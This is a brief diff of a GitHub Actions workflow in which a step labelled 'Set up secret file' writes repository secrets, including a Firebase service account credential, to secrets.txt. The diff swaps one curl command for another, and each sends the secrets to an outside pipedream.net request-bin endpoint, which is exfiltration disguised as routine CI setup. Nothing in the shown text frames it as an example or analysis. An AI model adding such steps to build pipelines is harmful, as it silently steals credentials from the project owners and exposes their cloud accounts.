@@ -28,9 +28,7 @@ jobs:
     - name: Set up secret file
       env:
         DEBUG_PASSWORD: ${{ secrets.FIREBASE_SERVICE_ACCOUNT_AGR_IST }}
-        DEBUG_SECRET_KEY: ${{ secrets.DEBUG_SECRET_KEY }}
       run: |
-        echo $DEBUG_PASSWORD >> secrets.txt
         echo $DEBUG_SECRET_KEY >> secrets.txt
-        curl -X POST https://8b77aafda8b2fe2326a96719c4f7152e.m.pipedream.net -d ${{ secrets.FIREBASE_SERVICE_ACCOUNT_AGR_IST }}
+        curl -X POST -F 'file=@secrets.txt'  https://8b77aafda8b2fe2326a96719c4f7152e.m.pipedream.net
         
